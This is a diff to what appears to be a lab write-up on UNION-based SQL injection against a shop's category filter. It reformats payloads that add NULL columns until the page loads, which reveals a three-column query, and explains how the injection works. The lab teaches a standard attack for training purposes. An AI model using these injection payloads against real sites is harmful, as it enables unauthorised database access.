@@ -16,25 +16,25 @@ GET /filter?category=Corporate+gifts HTTP/2
 
 ### 2. Modify the category parameter to inject SQL
 
-**Injected Payload:**
-```http
-GET /filter?category=Corporate+gifts'+UNION+SELECT+NULL-- HTTP/2
+```sql
+' UNION SELECT NULL--
 ```
+
 this displayed an error "Internal Server Error"
 
-```http
-GET /filter?category=Corporate+gifts'+UNION+SELECT+NULL,NULL-- HTTP/2
+```sql
+' UNION SELECT NULL,NULL--
 ```
 this also displayed an error "Internal Server Error"
 
-```http
-GET /filter?category=Corporate+gifts'+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
+```sql
+' UNION SELECT NULL,NULL,NULL--
 ```
 this loaded the webpage normally,indicating the original query returns 3 columns, and the payload now matches that structure.
 
 ### 3. Explanation
 
-`'+UNION+SELECT+NULL,NULL,NULL--` closes the string with `'`, adds a `UNION SELECT` clause with 3 columns (`NULL,NULL,NULL`), comments out the rest of the query using `--`.
+`' UNION SELECT NULL,NULL,NULL--` closes the string with `'`, adds a `UNION SELECT` clause with 3 columns (`NULL,NULL,NULL`), comments out the rest of the query using `--`.
 
 **The SQL query becomes:**
 
